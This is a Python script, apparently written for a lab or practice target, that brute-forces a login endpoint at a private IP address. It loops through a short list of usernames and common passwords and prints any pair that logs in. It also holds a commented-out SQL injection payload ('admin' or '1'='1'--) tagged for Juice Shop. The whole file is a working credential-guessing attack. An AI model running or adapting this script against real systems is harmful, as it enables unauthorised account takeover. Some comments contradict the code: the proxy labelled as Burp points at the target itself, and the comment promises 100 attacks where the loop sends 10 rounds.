import requests
import time

TARGET_URL = "http://172.20.10.12:8000/log-event"    # Backend API endpoint
SUCCESS_INDICATOR = "Success"

# usernames = ["admin' or '1'='1'--"] # Juice swap SQL injection
usernames = ["worker123, Admin"]
passwords = ["password123", "123456", "admin", "pwnd", "letmein"]

proxies = {
    "http": "http://172.20.10.12:8000/",   # Burp proxy (comment out if not needed)
    "https": "https://172.20.10.12:8000/"   
}

headers = {
    "Content-Type": "application/json"
}

session = requests.Session()
session.proxies.update(proxies)

for i in range(10):   # Complete when sending 100 attacks
    for username in usernames:
        for password in passwords:
            payload = {
                "username": username,   # Fixed: field name is "username", not "email"
                "password": password
            }
            print(f"Sending to Burp...\nUsername: {username}\nPassword: {password}")

            response = session.post(
                TARGET_URL,
                json=payload,
                headers=headers
            )

            if response.status_code == 200:
                data = response.json()
                if data.get("success"):   # Check for actual login success
                    print("SUCCESS!\n")
                    print(f"Credentials:\nUsername: {username}\nPassword: {password}")
                    print("Status:", response.status_code)
                    break
                else:
                    print("Status:", response.status_code)
                    print("Failed! Not found!\n")
            else:
                print("Status:", response.status_code)
                print("Failed!\n")

            time.sleep(0.4)
